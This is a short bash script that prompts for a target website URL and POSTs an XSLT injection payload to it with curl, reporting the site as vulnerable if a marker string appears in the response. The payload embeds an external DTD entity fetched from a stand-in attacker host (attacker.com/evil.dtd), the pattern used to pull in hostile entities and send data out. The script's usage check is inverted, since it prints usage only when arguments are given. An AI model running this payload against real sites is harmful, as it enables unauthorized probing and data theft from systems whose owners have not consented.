#!/bin/bash

# Function to display output in color
color_echo() {
    case $1 in
        red)
            echo -e "\033[0;31m$2\033[0m"
            ;;
        green)
            echo -e "\033[0;32m$2\033[0m"
            ;;
        yellow)
            echo -e "\033[0;33m$2\033[0m"
            ;;
        *)
            echo "$2"
            ;;
    esac
}

# Function to check if XSLT injection is possible
check_vulnerability() {
    local target_url="$1"
    local payloads=(
        '<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE xsl:stylesheet [
        <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
        %remote;
        %all;
        ]>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
        <html>
        <body>
        <h2>XSLT Injection Vulnerability Test</h2>
        <p>If you see this, the website is vulnerable to XSLT injection.</p>
        </body>
        </html>
        </xsl:template>
        </xsl:stylesheet>'
        # Add more payloads here
    )

    color_echo yellow "Testing for XSLT injection vulnerability..."
    for payload in "${payloads[@]}"; do
        color_echo yellow "Sending XSLT payload to the target URL..."
        local response=$(curl -s -X POST -d "$payload" "$target_url")
        if [[ "$response" =~ "XSLT Injection Vulnerability Test" ]]; then
            color_echo green "The target website is vulnerable to XSLT injection using the following payload:"
            color_echo green "$payload"
            return 0
        fi
    done

    color_echo red "The target website is not vulnerable to XSLT injection."
    return 1
}

# Main function
main() {
    color_echo yellow "Enter your target website URL: "
    read target_url

    check_vulnerability "$target_url"
}

# Run the main function with error handling and verbose output
if [[ $# -eq 0 ]]; then
    main
else
    echo "Usage: ./xslt_vulnerability_test.sh"
fi
